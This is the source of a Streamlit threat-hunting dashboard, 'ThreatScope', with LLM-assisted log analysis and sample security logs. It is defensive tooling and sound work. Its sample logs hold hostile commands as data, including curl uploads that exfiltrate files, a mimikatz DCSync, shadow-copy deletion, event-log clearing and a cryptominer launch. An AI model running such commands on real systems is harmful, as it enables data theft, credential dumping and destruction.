import json
import tempfile
import re
import urllib.request
import html as html_lib

import networkx as nx
import streamlit as st
from elasticsearch import Elasticsearch
from openai import OpenAI
from pyvis.network import Network
from streamlit_autorefresh import st_autorefresh

from engine.detections import run_detections

# =========================
# PAGE CONFIG
# =========================

st.set_page_config(
    page_title="ThreatScope | AI-Assisted Hunt Engine",
    page_icon="🛡️",
    layout="wide"
)

# Custom premium styling
st.markdown("""
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
    /* Global Styles */
    html, body, [class*="css"] {
        font-family: 'Inter', sans-serif;
    }
    h1, h2, h3, h4, h5, h6 {
        font-family: 'Outfit', sans-serif;
        font-weight: 600;
        letter-spacing: -0.02em;
    }
    
    /* Glowing Title Effect */
    .glowing-title {
        background: linear-gradient(135deg, #00f0ff 0%, #a855f7 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        font-size: 3rem !important;
        font-weight: 800 !important;
        margin-bottom: 5px !important;
        font-family: 'Outfit', sans-serif !important;
    }
    
    /* Metrics panel custom styles */
    div[data-testid="stMetricValue"] {
        font-family: 'Outfit', sans-serif;
        font-weight: 800;
        color: #00f0ff !important;
    }
    div[data-testid="metric-container"] {
        background-color: #161b26;
        border: 1px solid #1e293b;
        border-radius: 8px;
        padding: 15px;
        box-shadow: 0 4px 6px rgba(0,0,0,0.15);
    }
    
    /* Glassmorphism sidebar */
    section[data-testid="stSidebar"] {
        background-color: #0b0e14 !important;
        border-right: 1px solid #1e293b;
    }
    
    /* Dynamic timeline styling */
    .timeline-container {
        border-left: 2px solid #1e293b;
        margin-left: 10px;
        padding-left: 20px;
        position: relative;
    }
    .timeline-node {
        position: relative;
        margin-bottom: 20px;
    }
    .timeline-node::before {
        content: '';
        position: absolute;
        left: -27px;
        top: 3px;
        width: 12px;
        height: 12px;
        border-radius: 50%;
        background-color: #00f0ff;
        border: 2px solid #0b0e14;
        box-shadow: 0 0 8px #00f0ff;
    }
    .timeline-node.critical::before {
        background-color: #ef4444;
        box-shadow: 0 0 8px #ef4444;
    }
    .timeline-node.high::before {
        background-color: #f97316;
        box-shadow: 0 0 8px #f97316;
    }
    .timeline-node.medium::before {
        background-color: #eab308;
        box-shadow: 0 0 8px #eab308;
    }
    .timeline-node.low::before {
        background-color: #10b981;
        box-shadow: 0 0 8px #10b981;
    }
    
    .timeline-time {
        font-family: monospace;
        font-weight: 700;
        color: #94a3b8;
    }
</style>
""", unsafe_allow_html=True)

# Helper function to render styled detection cards
def render_detection_card(detection):
    severity = detection["severity"]
    color_map = {
        "CRITICAL": {"bg": "rgba(239, 68, 68, 0.1)", "border": "#ef4444", "text": "#fca5a5"},
        "HIGH": {"bg": "rgba(249, 115, 22, 0.1)", "border": "#f97316", "text": "#fed7aa"},
        "MEDIUM": {"bg": "rgba(234, 179, 8, 0.1)", "border": "#eab308", "text": "#fef08a"},
        "LOW": {"bg": "rgba(16, 185, 129, 0.1)", "border": "#10b981", "text": "#a7f3d0"}
    }
    cfg = color_map.get(severity, {"bg": "#1e293b", "border": "#64748b", "text": "#cbd5e1"})
    
    st.markdown(f"""
    <div style="background-color: {cfg['bg']}; border-left: 5px solid {cfg['border']}; border-right: 1px solid #1e293b; border-top: 1px solid #1e293b; border-bottom: 1px solid #1e293b; border-radius: 4px; padding: 15px; margin-bottom: 15px;">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <strong style="color: {cfg['text']}; font-size: 1.1rem; font-family: 'Outfit', sans-serif;">{detection['title']}</strong>
            <span style="background-color: {cfg['border']}; color: #000; padding: 2px 8px; border-radius: 12px; font-size: 0.75rem; font-weight: 800; font-family: sans-serif;">{severity}</span>
        </div>
        <p style="color: #cbd5e1; margin-top: 8px; margin-bottom: 8px; font-size: 0.9rem; font-family: sans-serif;">{detection['description']}</p>
        <div style="display: flex; gap: 15px; font-size: 0.8rem; color: #94a3b8; font-family: sans-serif;">
            <span><strong>MITRE ATT&CK:</strong> {detection['mitre']}</span>
            <span>|</span>
            <span><strong>Confidence:</strong> {detection['confidence']}</span>
        </div>
        <div style="margin-top: 5px; font-size: 0.8rem; color: #94a3b8; font-family: sans-serif;">
            <strong>Hunt Pivot:</strong> <span style="color: #00f0ff;">{detection['hunt_pivot']}</span>
        </div>
    </div>
    """, unsafe_allow_html=True)

# Helper function to render custom metric cards
def render_metric_card(label, value, color, icon):
    st.markdown(f"""
    <div style="background-color: #111524; border: 1px solid #1e293b; border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); border-top: 4px solid {color}; transition: all 0.3s ease;">
        <div style="font-size: 2.2rem; margin-bottom: 8px;">{icon}</div>
        <div style="color: #94a3b8; font-size: 0.8rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.08em; font-family: 'Inter', sans-serif;">{label}</div>
        <div style="color: #f8fafc; font-size: 2.2rem; font-weight: 800; margin-top: 5px; font-family: 'Outfit', sans-serif;">{value}</div>
    </div>
    """, unsafe_allow_html=True)

# =========================
# GROQ CLIENT
# =========================

client = OpenAI(
    api_key=st.secrets["GROQ_API_KEY"],
    base_url="https://api.groq.com/openai/v1"
)

# =========================
# TITLE & PULSING STATUS BEACON
# =========================

st.markdown("""
<div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #1e293b; padding-bottom: 15px; margin-bottom: 25px;">
    <div>
        <h1 class="glowing-title" style="margin: 0; padding: 0;">ThreatScope</h1>
        <p style="color: #94a3b8; font-size: 0.95rem; margin-top: 5px; margin-bottom: 0; font-family: 'Inter', sans-serif;">
            AI-assisted telecom, identity, and infrastructure threat hunting workspace.
        </p>
    </div>
    <div style="display: flex; align-items: center; background-color: rgba(0, 240, 255, 0.05); border: 1px solid rgba(0, 240, 255, 0.2); border-radius: 8px; padding: 8px 16px; box-shadow: 0 0 15px rgba(0, 240, 255, 0.05);">
        <div style="position: relative; width: 10px; height: 10px; margin-right: 12px;">
            <span style="display: block; width: 10px; height: 10px; background-color: #00f0ff; border-radius: 50%;"></span>
            <span style="position: absolute; top: 0; left: 0; display: block; width: 10px; height: 10px; background-color: #00f0ff; border-radius: 50%; animation: pulse-glow 2s infinite ease-in-out; opacity: 0.75;"></span>
        </div>
        <span style="color: #f8fafc; font-size: 0.85rem; font-weight: 700; font-family: 'Inter', sans-serif; letter-spacing: 0.05em;">HUNT ENGINE ACTIVE</span>
    </div>
</div>
<style>
@keyframes pulse-glow {
    0% { transform: scale(1); opacity: 0.75; }
    50% { transform: scale(2.2); opacity: 0; }
    100% { transform: scale(1); opacity: 0; }
}
</style>
""", unsafe_allow_html=True)

# =========================
# WORKSPACE TABS INITIALIZATION
# =========================
tab_ingest, tab_hunt, tab_graph, tab_report = st.tabs([
    "📥 Ingest & Intel",
    "📊 Detections & Timeline",
    "🕸️ Entity Correlation Graph",
    "📝 AI Analysis & Report"
])

# =========================
# HELPER FUNCTIONS & LOGIC
# =========================

def parse_log_line(line):
    line = line.strip()
    if not line:
        return None
    # Try parsing as JSON first
    try:
        return json.loads(line)
    except Exception:
        pass
    
    # Try parsing as timestamp + key=value pairs
    event = {}
    timestamp_match = re.match(r'^(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z)\s+(.*)$', line)
    if timestamp_match:
        event["@timestamp"] = timestamp_match.group(1)
        remaining = timestamp_match.group(2)
    else:
        remaining = line
        
    pairs = re.findall(r'(\w+)=(?:"([^"]*)"|([^\s]*))', remaining)
    for key, val_q, val_uq in pairs:
        val = val_q if val_q is not None and val_q != "" else val_uq
        event[key] = val
        
    return event


def extract_text_from_file(uploaded_file):
    if uploaded_file.name.endswith(".pdf"):
        try:
            import pypdf
            reader = pypdf.PdfReader(uploaded_file)
            text = ""
            for page in reader.pages:
                text += page.extract_text() + "\n"
            return text
        except ImportError:
            return "PDF support requires the 'pypdf' package. Please install it with: pip install pypdf"
    else:
        return uploaded_file.read().decode("utf-8", errors="ignore")


def fetch_url_content(url):
    try:
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "https://" + url
        req = urllib.request.Request(
            url, 
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            html = response.read().decode('utf-8')
            html = re.sub(r'<script.*?</script>', '', html, flags=re.DOTALL | re.IGNORECASE)
            html = re.sub(r'<style.*?</style>', '', html, flags=re.DOTALL | re.IGNORECASE)
            html = re.sub(r'<!--.*?-->', '', html, flags=re.DOTALL)
            text = re.sub(r'<[^>]+>', ' ', html)
            text = html_lib.unescape(text)
            text = re.sub(r'\s+', ' ', text)
            return text.strip()
    except Exception as e:
        return f"Error fetching URL: {e}"


def extract_threat_brief_fallback(text):
    ips = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', text)
    unique_ips = list(set(ips))
    
    users = re.findall(r'\buser=([^\s]+)\b|\bactor=([^\s]+)\b|\bworker=([^\s]+)\b', text)
    unique_users = []
    for u1, u2, u3 in users:
        u = u1 or u2 or u3
        if u and u not in unique_users:
            unique_users.append(u)
            
    processes = re.findall(r'\bprocess=([^\s]+)\b|\bprocess\.name":\s*"([^"]+)"', text)
    unique_procs = []
    for p1, p2 in processes:
        p = p1 or p2
        if p and p not in unique_procs:
            unique_procs.append(p)
            
    iocs = []
    for ip in unique_ips:
        iocs.append(f"IP: {ip}")
    for u in unique_users:
        iocs.append(f"User/Actor: {u}")
    for p in unique_procs:
        iocs.append(f"Process: {p}")
        
    behaviors = []
    if "vpn_login" in text:
        behaviors.append("VPN login event detected.")
    if "mfa_push" in text:
        behaviors.append("MFA push notification action detected.")
    if "powershell.exe" in text:
        behaviors.append("PowerShell command execution observed.")
    if "wmic.exe" in text:
        behaviors.append("Windows Management Instrumentation (WMI) query or execution.")
    if "GlobalAdmin" in text:
        behaviors.append("Privileged Azure GlobalAdmin role modification.")
    if "SS7" in text or "Diameter" in text or "GTP" in text:
        behaviors.append("Telecom signaling traffic anomaly (SS7/Diameter/GTP).")
        
    summary = "Automatically parsed security telemetry. "
    if behaviors:
        summary += f"Identified {len(behaviors)} potential behavioral events."
    else:
        summary += "No clear threat events parsed from telemetry."
        
    return {
        "summary": summary,
        "behaviors": behaviors if behaviors else ["No behaviors extracted."],
        "iocs": iocs if iocs else ["No IOCs extracted."]
    }


@st.cache_data(show_spinner=True)
def extract_threat_brief_from_llm(text):
    if not text.strip():
        return {
            "summary": "No threat intelligence text provided.",
            "behaviors": [],
            "iocs": []
        }
    try:
        prompt = f"""
        You are a defensive cyber threat intelligence analyst.
        Analyze the following security telemetry logs or threat report and extract:
        1. A concise, professional executive summary of the threat activity (2-3 sentences).
        2. A list of behavioral indicators (e.g., specific commands, TTPs, suspicious process creations, network commands, actions).
        3. A list of indicators of compromise (IOCs) such as IP addresses, domains, files, registry keys, roles, or usernames.

        Return ONLY a valid JSON object. Do not include any markdown formatting (like ```json or ```) or conversational text. The JSON object must have exactly this structure:
        {{
            "summary": "Detailed summary...",
            "behaviors": [
                "Behavior 1",
                "Behavior 2"
            ],
            "iocs": [
                "IOC 1",
                "IOC 2"
            ]
        }}

        Telemetry/Report to analyze:
        {text}
        """
        response = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=[
                {
                    "role": "system",
                    "content": "You are a defensive cyber threat intelligence analyst. Only return valid JSON."
                },
                {
                    "role": "user",
                    "content": prompt
                }
            ],
            temperature=0.1,
            max_tokens=800
        )
        output = response.choices[0].message.content.strip()
        if output.startswith("```"):
            output = re.sub(r'^```(?:json)?\n', '', output)
            output = re.sub(r'\n```$', '', output)
        data = json.loads(output)
        return data
    except Exception as e:
        return extract_threat_brief_fallback(text)


def render_card(title, content, color):
    st.markdown(f"""
    <div style="background-color: #111524; border: 1px solid #1e293b; border-radius: 10px; padding: 15px 20px; margin-bottom: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.2);">
        <h4 style="color: {color}; margin-top: 0; margin-bottom: 8px; font-weight: 600; font-size: 0.95rem; font-family: sans-serif;">{title}</h4>
        <div style="color: #94a3b8; font-size: 0.85rem; line-height: 1.5; font-family: sans-serif;">{content}</div>
    </div>
    """, unsafe_allow_html=True)


def fetch_elastic_events(index_name="threatscope-logs", limit=25):
    es = Elasticsearch("http://localhost:9200")

    response = es.search(
        index=index_name,
        size=limit,
        sort=[
            {
                "@timestamp": {
                    "order": "asc"
                }
            }
        ],
        query={
            "match_all": {}
        }
    )

    events = []
    for hit in response["hits"]["hits"]:
        events.append(hit["_source"])

    return events


def events_to_text(events):
    lines = []
    for event in events:
        lines.append(
            json.dumps(event, default=str)
        )
    return "\n".join(lines)


# =========================
# SAMPLE LOGS & STATIC BRIEFS
# =========================

sample_logs = {
    "Full Correlated Hunt Case": """
2026-05-11T07:41:22Z source=SIEM event=vpn_login user=contractor.mills status=success source_ip=185.220.101.44 country=RU device=new-device
2026-05-11T07:44:02Z source=SIEM event=vpn_login user=contractor.mills status=success source_ip=104.28.45.12 country=US device=known-laptop
2026-05-11T07:48:19Z source=SIEM event=mfa_push user=contractor.mills result=approved source_ip=185.220.101.44
2026-05-11T07:56:10Z source=SIEM device=cisco-edge-12 event=remote_mgmt_enabled protocol=ssh actor=contractor.mills
2026-05-11T08:02:44Z host=CORP-LT-448 process=powershell.exe command="-enc SQBFAFgA..." parent=winword.exe
2026-05-11T08:04:30Z host=CORP-LT-448 process=wmic.exe command="wmic process call create powershell.exe"
2026-05-11T08:06:55Z user=contractor.mills azure_role_assignment role=GlobalAdmin actor=contractor.mills
2026-05-11T08:21:55Z source=telecom_signaling protocol=Diameter event=unusual_roaming_auth subscriber_region=US request_origin=foreign_network
2026-05-11T08:25:13Z source=telecom_signaling protocol=SS7 event=location_query_volume_spike subscriber_count=218 request_origin=foreign_network
2026-05-11T08:29:45Z source=telecom_signaling protocol=GTP event=abnormal_roaming_session subscriber_region=US request_origin=foreign_network
2026-05-11T08:31:42Z applicant=remote.engineer.17 resume_signal=overlapping_employment verification_status=unverified requested_access=vpn,router_admin
2026-05-11T08:40:12Z worker=contractor.mills login_location_change=US_to_RU time_window_minutes=15 device_status=new-device
2026-05-11T08:44:19Z user=contractor.mills oauth_app_consent app=UnknownMailSync permissions=Mail.Read offline_access
""",

    "VPN / Initial Access Broker Activity": """
2026-05-11T07:41:22Z source=SIEM event=vpn_login user=contractor.mills status=success source_ip=185.220.101.44 country=RU device=new-device
2026-05-11T07:44:02Z source=SIEM event=vpn_login user=contractor.mills status=success source_ip=104.28.45.12 country=US device=known-laptop
2026-05-11T07:48:19Z source=SIEM event=mfa_push user=contractor.mills result=approved source_ip=185.220.101.44
""",

    "Edge Device / LOTL Activity": """
2026-05-11T07:56:10Z source=SIEM device=cisco-edge-12 event=remote_mgmt_enabled protocol=ssh actor=contractor.mills
2026-05-11T08:02:44Z host=CORP-LT-448 process=powershell.exe command="-enc SQBFAFgA..." parent=winword.exe
2026-05-11T08:04:30Z host=CORP-LT-448 process=wmic.exe command="wmic process call create powershell.exe"
2026-05-11T08:06:55Z user=contractor.mills azure_role_assignment role=GlobalAdmin actor=contractor.mills
""",

    "Telecom Signaling Threats": """
2026-05-11T08:21:55Z source=telecom_signaling protocol=Diameter event=unusual_roaming_auth subscriber_region=US request_origin=foreign_network
2026-05-11T08:25:13Z source=telecom_signaling protocol=SS7 event=location_query_volume_spike subscriber_count=218 request_origin=foreign_network
2026-05-11T08:29:45Z source=telecom_signaling protocol=GTP event=abnormal_roaming_session subscriber_region=US request_origin=foreign_network
""",

    "Fraudulent Worker / Contractor Risk": """
2026-05-11T08:31:42Z applicant=remote.engineer.17 resume_signal=overlapping_employment verification_status=unverified requested_access=vpn,router_admin
2026-05-11T08:40:12Z worker=contractor.mills login_location_change=US_to_RU time_window_minutes=15 device_status=new-device
2026-05-11T08:44:19Z user=contractor.mills oauth_app_consent app=UnknownMailSync permissions=Mail.Read offline_access
""",

    "SIM Swap & Hijack Case": """
2026-05-12T09:12:05Z source=telecom_signaling protocol=SS7 event=anyTimeInterrogation subscriber_msisdn=15550199283 request_origin=foreign_network
2026-05-12T09:14:12Z source=HLR event=sim_update subscriber_msisdn=15550199283 old_imsi=310260123456789 new_imsi=310260987654321 status=success
2026-05-12T09:17:44Z source=IAM event=password_reset_request user=it.director status=requested method=SMS_OTP
2026-05-12T09:18:10Z source=IAM event=password_reset_success user=it.director method=SMS_OTP source_ip=198.51.100.75
2026-05-12T09:20:30Z source=SIEM event=vpn_login user=it.director status=success source_ip=198.51.100.75 country=BR device=unrecognized-macbook
2026-05-12T09:24:15Z host=PROD-DB-01 process=pg_dump.exe command="pg_dump -U postgres main_prod > backup.sql" user=it.director
2026-05-12T09:28:50Z host=PROD-DB-01 process=curl.exe command="curl -T backup.sql https://transfer.sh/" user=it.director
""",

    "Cloud Infrastructure Ransomware": """
2026-05-12T14:02:11Z source=CloudTrail event=ConsoleLogin user=admin.cloud status=success source_ip=203.0.113.110 country=CN MFA=disabled
2026-05-12T14:05:40Z source=CloudTrail event=UpdateTrail name=primary-audit-trail status=stopped user=admin.cloud
2026-05-12T14:10:15Z source=CloudTrail event=CreateVirtualMachine user=admin.cloud count=12 instance_type=c5.metal region=us-east-1
2026-05-12T14:15:33Z source=CloudTrail event=DeleteVaultKey vault=prod-kms-key user=admin.cloud status=success
2026-05-12T14:18:50Z host=DEVEL-SRV-02 process=vssadmin.exe command="vssadmin delete shadows /all /quiet" user=SYSTEM
2026-05-12T14:20:02Z host=DEVEL-SRV-02 process=cipher.exe command="cipher /w:C:\" user=SYSTEM
""",

    "Supply Chain Pipeline Compromise": """
2026-05-13T10:02:15Z source=GitHub event=push repo=corporate-app user=dev.clara branch=main commit=e3a9f02 source_ip=198.51.100.99 country=UA
2026-05-13T10:04:12Z source=Jenkins event=build_start project=corporate-app build_number=1442 runner=jenkins-worker-01
2026-05-13T10:05:30Z host=jenkins-worker-01 process=npm event=package_install dependency=colors-validator version=1.2.4 status=downloaded
2026-05-13T10:05:44Z host=jenkins-worker-01 process=node event=postinstall_execution script="node ./scripts/compile.js"
2026-05-13T10:06:02Z host=jenkins-worker-01 process=curl event=outbound_connection dest_ip=91.198.115.42 dest_port=80 user=jenkins-worker-01
2026-05-13T10:08:12Z source=IAM event=api_key_created user=dev.clara name=prod-deployer-key actor=jenkins-worker-01
2026-05-13T10:10:45Z source=CloudIdentity event=RoleAssignment role=KubernetesClusterAdmin target=prod-deployer-key status=success
""",

    "Insider Threat / IP Theft": """
2026-05-13T23:14:02Z source=ActiveDirectory event=login user=analyst.jones status=success source_ip=192.168.1.15 hour=off-hours
2026-05-13T23:18:22Z host=CORP-LT-102 process=powershell.exe command="Get-ChildItem -Path \\\\shares\\research\\* -Include *.pdf,*.docx -Recurse"
2026-05-13T23:22:15Z host=CORP-LT-102 process=7z.exe command="7z.exe a -pSecretKey123! backup.7z \\\\shares\\research\\*"
2026-05-13T23:26:40Z host=CORP-LT-102 process=curl.exe command="curl.exe -F file=@backup.7z https://filetransfer.io/upload"
2026-05-13T23:30:12Z host=CORP-LT-102 process=wevtutil.exe command="wevtutil.exe cl Security" user=SYSTEM
""",

    "Kubernetes Cryptojacking (K8s Abuse)": """
2026-05-14T11:02:15Z source=Kubernetes event=CreatePod pod_name=api-cache-manager namespace=prod-web image=miner-pool/xmrig:latest user=dev.clara
2026-05-14T11:05:30Z host=k8s-node-4 process=xmrig command="./xmrig --donate-level 1 -o pool.supportxmr.com:5555 -u 44AFF..." parent=containerd user=root
2026-05-14T11:06:02Z host=k8s-node-4 dest_ip=192.99.142.235 dest_port=5555 event=outbound_mining_pool protocol=TCP
2026-05-14T11:08:12Z source=Kubernetes event=CreateRoleBinding role=cluster-admin target=kube-system-attacker namespace=kube-system
""",

    "Active Directory DCSync & Ticket Abuse": """
2026-05-14T15:20:10Z source=ActiveDirectory event=TGS_Request service=MSSQLSvc/db-prod.corp:1433 user=user.alice ticket_encryption=RC4 status=success
2026-05-14T15:22:45Z source=ActiveDirectory event=TGT_Request ticket_lifetime=99999 user=user.alice ticket_flags=0x40e00000 status=success
2026-05-14T15:25:30Z host=DC-01 process=mimikatz.exe command="lsadump::dcsync /domain:corp.local /user:krbtgt" user=SYSTEM parent=cmd.exe
2026-05-14T15:28:15Z host=DC-01 process=wevtutil.exe command="wevtutil.exe cl Security" user=SYSTEM
""",

    "API Token Abuse & Data Scraping": """
2026-05-15T02:04:12Z source=APIGateway event=access_token_creation client_id=analytics-sync-service scope=read:all status=success source_ip=45.227.254.12
2026-05-15T02:06:40Z source=APIGateway event=data_query query="SELECT * FROM customers_pii" records_returned=5280000 status=success source_ip=45.227.254.12
2026-05-15T02:10:15Z host=api-gateway-01 process=curl.exe command="curl.exe -F file=@pii_dump.csv http://mega.nz/upload" user=gateway-service
"""
}

pre_extracted_briefs = {
    "Full Correlated Hunt Case": {
        "summary": "A coordinated, multi-stage attack was identified targeting identity, endpoint, and cloud infrastructure. The intrusion began with VPN credential abuse from a foreign IP (Russia), followed by MFA request approval, SSH remote management enablement on edge devices, and subsequent Windows Management Instrumentation (WMI) and PowerShell execution. The actor eventually escalated privileges to Azure 'GlobalAdmin' and established persistence via OAuth mail synchronization permissions, while simultaneously executing location query volume spikes and roaming sessions over telecom signaling protocols (Diameter, SS7, GTP).",
        "behaviors": [
            "Anomalous VPN authentication from a Russian IP (185.220.101.44) followed by a US login (104.28.45.12).",
            "MFA request approval bypass following suspicious VPN credentials verification.",
            "SSH remote management services enabled on edge router cisco-edge-12.",
            "Execution of obfuscated, base64-encoded PowerShell command launched from winword.exe.",
            "Lateral movement or process execution using wmic.exe on internal host CORP-LT-448.",
            "Unauthorized assignment of the highly privileged 'GlobalAdmin' role to contractor.mills.",
            "OAuth consent granted to an unknown application (UnknownMailSync) with Mail.Read scopes.",
            "Telecom signaling anomalies: location queries volume spike (218 subscribers) via SS7, roaming auth anomalies via Diameter, and GTP roaming session anomaly."
        ],
        "iocs": [
            "IP: 185.220.101.44 (Russia)",
            "IP: 104.28.45.12 (United States)",
            "Account: contractor.mills",
            "Target Device: cisco-edge-12",
            "Endpoint Host: CORP-LT-448",
            "Registry/App: UnknownMailSync",
            "Privileges: Azure GlobalAdmin Role",
            "Protocols: SS7 (Location Query Spike), Diameter (Auth Anomaly), GTP (Roaming Session Anomaly)"
        ]
    },
    "VPN / Initial Access Broker Activity": {
        "summary": "Suspicious authentication activity was identified involving a contractor account. Two successful VPN logins were recorded within a 3-minute window from geographically impossible locations (Russia and the United States). An MFA push notification was subsequently approved from the Russian IP address, suggesting credentials compromise and MFA fatigue or bypass.",
        "behaviors": [
            "Geographically anomalous VPN login activity (impossible travel) within 3 minutes.",
            "MFA push approval associated with a suspicious foreign IP address."
        ],
        "iocs": [
            "IP: 185.220.101.44 (Russia)",
            "IP: 104.28.45.12 (United States)",
            "Account: contractor.mills"
        ]
    },
    "Edge Device / LOTL Activity": {
        "summary": "Defenders observed an active Living-off-the-Land (LOTL) campaign. The threat actor enabled SSH remote management on an edge router (cisco-edge-12), executed obfuscated PowerShell commands spawned from Microsoft Word, and utilized WMIC for local process creation. This activity was followed by the escalation of the actor's privileges to Azure GlobalAdmin.",
        "behaviors": [
            "Modification of edge router configuration to enable SSH remote management (cisco-edge-12).",
            "Living-off-the-Land process execution (encoded PowerShell command spawned by winword.exe).",
            "WMI invocation to remotely spawn PowerShell processes (wmic process call create).",
            "Privilege escalation via unauthorized Azure GlobalAdmin assignment by contractor.mills."
        ],
        "iocs": [
            "Device: cisco-edge-12",
            "Host: CORP-LT-448",
            "Process: powershell.exe",
            "Process: wmic.exe",
            "Parent Process: winword.exe",
            "Role: GlobalAdmin",
            "Account: contractor.mills",
            "Command: -enc SQBFAFgA..."
        ]
    },
    "Telecom Signaling Threats": {
        "summary": "Significant signaling anomalies were identified in telecom core routing protocols. Telemetry indicates a location query volume spike targeting 218 subscribers via the SS7 protocol, coupled with unusual roaming authentication attempts over Diameter and abnormal GTP roaming sessions. This behavior is consistent with subscriber tracking and communication intercept campaigns.",
        "behaviors": [
            "SS7 location query volume spike targeting 218 unique subscribers from a foreign network.",
            "Anomalous roaming authentication requests originating from foreign networks via Diameter.",
            "Abnormal GTP roaming session establishment attempts."
        ],
        "iocs": [
            "Protocols: SS7, Diameter, GTP",
            "Context: Location query volume spike (218 subscribers)",
            "Source: foreign_network"
        ]
    },
    "Fraudulent Worker / Contractor Risk": {
        "summary": "An identity and compliance threat was flagged regarding a contractor account. Anomalies include an overlapping employment indicator on the resume, a sudden shift in login location from the US to Russia within 15 minutes, and the granting of OAuth consent to a suspicious application named 'UnknownMailSync' with Mail.Read permissions.",
        "behaviors": [
            "Onboarding verification anomalies (overlapping employment flags).",
            "Anomalous traveler check-in (US to RU login transition in 15 minutes).",
            "OAuth consent grant to non-standard application requesting sensitive read permissions."
        ],
        "iocs": [
            "Account: contractor.mills",
            "Applicant Profile: remote.engineer.17",
            "Application: UnknownMailSync",
            "OAuth Permission: Mail.Read, offline_access"
        ]
    },
    "SIM Swap & Hijack Case": {
        "summary": "A sophisticated subscriber targeted attack was identified starting with SS7 location queries (AnyTimeInterrogation) followed by a successful SIM Swap (sim_update) on the victim's mobile number. The attacker subsequently requested an SMS OTP password reset to hijack the corporate account of the 'it.director'. A VPN login was then established from a foreign IP (Brazil), leading to database credential dumping via pg_dump and exfiltration over curl to a public sharing service.",
        "behaviors": [
            "Anomalous SS7 signaling location query targeting a specific subscriber.",
            "SIM update (SIM swap) completed in HLR database.",
            "SMS OTP password reset requested and approved within minutes.",
            "Anomalous VPN authentication from a Brazilian IP using the hijacked it.director credentials.",
            "Database dump execution using pg_dump.exe on CORP-DB-01.",
            "Data exfiltration to external sharing service transfer.sh using curl.exe."
        ],
        "iocs": [
            "MSISDN: 15550199283",
            "IP: 198.51.100.75 (Brazil)",
            "Account: it.director",
            "Host: PROD-DB-01",
            "Process: pg_dump.exe",
            "Process: curl.exe",
            "Domain: transfer.sh"
        ]
    },
    "Cloud Infrastructure Ransomware": {
        "summary": "An adversary compromised the privileged 'admin.cloud' role, logging in without MFA from a Chinese IP. The attacker disabled auditing (UpdateTrail stopped), provisioned multiple massive crypto-mining VMs (c5.metal), and deleted the product KMS key vault. On internal host DEVEL-SRV-02, the attacker deleted volume shadow copies (vssadmin) and ran cipher to wipe storage, indicating prep work for ransomware deployment.",
        "behaviors": [
            "Console login with MFA disabled from a foreign IP (China).",
            "Audit log trail logging stopped (UpdateTrail).",
            "Provisioning of 12 c5.metal high-performance compute instances.",
            "Destruction of production KMS cryptographic key vault.",
            "Deletion of volume shadow copies (vssadmin delete shadows) to inhibit system recovery.",
            "Wiping storage empty space using cipher.exe command."
        ],
        "iocs": [
            "IP: 203.0.113.110 (China)",
            "Account: admin.cloud",
            "Key Vault: prod-kms-key",
            "Host: DEVEL-SRV-02",
            "Process: vssadmin.exe",
            "Process: cipher.exe"
        ]
    },
    "Supply Chain Pipeline Compromise": {
        "summary": "An adversary compromised the credentials of 'dev.clara' to push commits containing a malicious dependency package (colors-validator) to the code repository. During the Jenkins CI/CD execution, a post-install compilation script executed a curl payload, harvested local environment secrets, created an IAM deployer API key, and assigned Kubernetes Cluster Admin rights to establish cloud persistence.",
        "behaviors": [
            "Unauthorized push to main branch from Ukrainian IP.",
            "Malicious post-install compilation script execution during package install.",
            "Outbound HTTP request from Jenkins build agent to command server.",
            "Unauthorized creation of IAM deployment key inside CI runner.",
            "High-privilege cloud role assignment (KubernetesClusterAdmin) to the deployment key."
        ],
        "iocs": [
            "Account: dev.clara",
            "IP: 198.51.100.99 (Ukraine)",
            "Runner: jenkins-worker-01",
            "Dependency: colors-validator",
            "IP: 91.198.115.42",
            "API Key: prod-deployer-key"
        ]
    },
    "Insider Threat / IP Theft": {
        "summary": "A corporate analyst logged in off-hours to recursively search and identify document assets on internal file shares. The user compressed the collected documents into a password-protected 7z archive and uploaded the data using curl to filetransfer.io, followed by clearing the security event log (wevtutil) to hide exfiltration indicators.",
        "behaviors": [
            "Unusual off-hours Active Directory authentication.",
            "Recursive file search for PDF and DOCX files on file shares.",
            "Password-protected compression of corporate files using 7z.",
            "Outbound data exfiltration via curl to a public file sharing site.",
            "Anti-forensic log clearing command (wevtutil cl Security) to remove activity trails."
        ],
        "iocs": [
            "Account: analyst.jones",
            "Host: CORP-LT-102",
            "Process: powershell.exe",
            "Process: 7z.exe",
            "Process: curl.exe",
            "Process: wevtutil.exe",
            "File: backup.7z",
            "Domain: filetransfer.io"
        ]
    },
    "Kubernetes Cryptojacking (K8s Abuse)": {
        "summary": "An adversary compromised developer credentials (dev.clara) to launch a rogue cryptomining pod ('api-cache-manager') inside the production Kubernetes cluster, executing the XMRig mining binary inside a container, initiating egress mining pool connections, and securing cluster persistence by establishing a cluster-admin RoleBinding.",
        "behaviors": [
            "Unauthorized pod deployment utilizing a public XMRig cryptomining container image.",
            "Execution of cryptomining binary (XMRig) running as root inside a cluster pod.",
            "Outbound network egress connection targeting a known public cryptomining pool IP.",
            "Creation of cluster-admin RoleBinding to establish persistence within the Kubernetes cluster."
        ],
        "iocs": [
            "Account: dev.clara",
            "Pod: api-cache-manager (prod-web namespace)",
            "Image: miner-pool/xmrig:latest",
            "Process: xmrig",
            "Destination IP: 192.99.142.235",
            "Destination Port: 5555",
            "RoleBinding: cluster-admin -> kube-system-attacker"
        ]
    },
    "Active Directory DCSync & Ticket Abuse": {
